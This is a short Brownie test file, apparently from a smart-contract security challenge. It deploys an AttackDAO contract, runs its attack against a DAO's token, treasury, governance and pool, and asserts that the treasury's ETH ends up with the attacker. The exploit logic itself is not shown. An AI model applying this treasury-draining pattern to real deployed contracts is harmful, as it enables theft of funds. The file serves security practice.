from scripts.dao3_helper import *
from brownie import AttackDAO

def test_dao3_exploit():
    attackerInitialETHBalance = attacker.balance()
    #txs = Wei('0.2 ether') # should account for gas transaction if I choose to test using gas.

    # Deploying DAO Attack contract
    attackDAO = AttackDAO.deploy(token, treasury, governance, pool,{'from': attacker})

    # Attack
    attackDAO.attack({'from': attacker})

    # No ETH left in treasury
    assert(treasury.balance() == 0)

    # Attacker has all the tokens
    assert(attacker.balance() == attackerInitialETHBalance + ETH_IN_TREASURY )# (txs) should account for gas transaction if I choose to test using gas.